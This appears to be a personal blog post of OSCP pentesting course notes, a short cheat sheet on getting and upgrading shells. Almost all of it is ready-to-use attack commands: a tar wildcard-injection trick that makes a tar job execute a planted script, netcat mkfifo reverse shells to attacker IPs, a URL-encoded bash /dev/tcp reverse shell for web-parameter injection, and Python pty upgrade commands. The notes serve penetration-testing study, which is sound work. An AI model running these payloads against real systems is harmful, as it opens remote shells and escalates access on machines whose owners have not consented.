---
layout: post
title: Shells
date: 2021-06-29 13:46
author: frank
comments: true
categories: [OSCP]
---
<p lang="en-US">The following is notes from my pentesting course for OSCP</p>
<p lang="en-US" style="margin: 0in; font-family: Calibri; font-size: 11.0pt;">If there is a app using tar * you can do the following</p>
<p lang="en-US" style="margin: 0in; font-family: Calibri; font-size: 11.0pt;">echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.9.218.104 4444 &gt;/tmp/f" shell.sh
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch "/var/www/html/--checkpoint=1"</p>
<p lang="en-US" style="margin: 0in; font-family: Calibri; font-size: 11.0pt;">Clean Shell using Phone on Linux</p>
<p lang="en-US" style="margin: 0in; margin-left: .375in; font-family: Calibri; font-size: 11.0pt;">python -c 'import pty; pty.spawn("/bin/bash")'</p>
<p lang="en-US" style="margin: 0in; margin-left: .375in; font-family: Calibri; font-size: 11.0pt;">python3 -c 'import pty; pty.spawn("/bin/bash")'</p>
<p lang="en-US" style="margin: 0in; font-family: Calibri; font-size: 11.0pt;"># Simple shell</p>
<p lang="en-US" style="margin: 0in; margin-left: .375in; font-family: Calibri; font-size: 11.0pt;">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.35 443 &gt;/tmp/f</p>
<p lang="en-US" style="margin: 0in; font-family: Calibri; font-size: 11.0pt;"># Bash Reverse Shell</p>
<p lang="en-US" style="margin: 0in; margin-left: .375in; font-family: Calibri; font-size: 11.0pt;">bash+-c+'bash+-i+&gt;%26+/dev/tcp/10.10.14.14/443+0&gt;%261'%26host=</p>
<p lang="en-US" style="margin: 0in; font-family: Calibri; font-size: 11.0pt;">More of a read</p>
<p lang="en-US" style="margin: 0in; font-family: Calibri; font-size: 11.0pt;"><a href="https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/">https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/</a></p>
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
<p lang="en-US" style="margin: 0in; font-family: Calibri; font-size: 11.0pt;"></p>
